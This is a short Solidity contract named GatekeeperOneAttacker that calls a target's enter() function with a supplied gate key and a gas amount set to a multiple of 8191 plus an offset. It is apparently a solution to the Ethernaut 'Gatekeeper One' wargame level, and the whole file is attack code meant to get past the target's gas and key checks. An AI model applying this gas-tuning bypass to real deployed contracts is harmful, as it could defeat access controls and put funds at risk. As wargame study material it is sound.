// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperOneAttacker {
    IGatekeeperOne private target;

    constructor(address _target) {
        target = IGatekeeperOne(_target);
    }

    function enter(uint256 gasOffset, bytes8 _gateKey) public {
        target.enter{gas: 8191 * 10 + gasOffset}(_gateKey);
    }
}
